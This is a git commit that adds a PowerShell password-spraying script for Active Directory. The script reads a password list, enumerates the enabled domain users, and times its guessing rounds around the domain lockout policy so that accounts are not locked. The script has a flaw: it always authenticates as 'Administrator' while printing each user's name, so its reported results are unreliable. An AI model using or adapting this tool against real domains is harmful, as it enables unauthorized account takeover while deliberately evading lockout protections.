b38e95c0498a9677c5a2ac8e0ba9a953024b33fe
Thorsten Jung <80363721+thorstenjung@users.noreply.github.com>
2021-12-21 22:13:12 +0100

    Create easyPwdSprayer.ps1

---
+++ easyPwdSprayer.ps1
@@ -0,0 +1,36 @@
+$Domain = Get-ADDomain
+
+$PasswordList = Get-Content C:\temp\pwlist.txt
+$UserList = Get-ADUser -Properties samAccountName, BadPWDCount -Filter {Enabled -eq $true}
+
+$PwPolicy = Get-ADDefaultDomainPasswordPolicy
+$LockWindow = $PwPolicy.LockoutObservationWindow.TotalSeconds
+$LockThreshold = $PwPolicy.LockoutThreshold
+$LoopCount = 0
+
+$UserDomain = $Domain.Name+'\'+"Administrator"
+Foreach($PassToTest in $PasswordList){
+    $SecurePassword = ConvertTo-SecureString -String $PassToTest -AsPlainText -Force
+    Foreach($user in $UserList) {
+
+    $Credentials = New-Object System.Management.Automation.PSCredential $UserDomain, $SecurePassword
+        try {
+        $testCred = get-ADUser -Filter * -Credential $Credentials
+        $userPWcheck = get-ADUser -Identity "Administrator" -Property BadPWDCount
+        $userPWCount = $userPWCheck.BadPWDCount
+        Write-Host "Treffer: " $PassToTest "->" $User.SamAccountName "->" $User.BadPWDCount
+        }
+        catch {
+        Write-Host "Passwort falsch: " $PassToTest "->" $User.SamAccountName "->" $User.BadPWDCount
+        }
+    }
+
+     $LoopCount = $LoopCount + 1
+     If ($LoopCount -ge ($LockThreshold - 1)) {
+        $LoopCount = 0
+        Write-Host "Waiting " (($LockWindow + 30)/60) " Minutes"
+        $Date = Get-Date
+        Write-Host "Next try " $Date.AddSeconds($LockWindow + 30)
+        Start-Sleep -Seconds ($LockWindow + 30)
+     }
+}
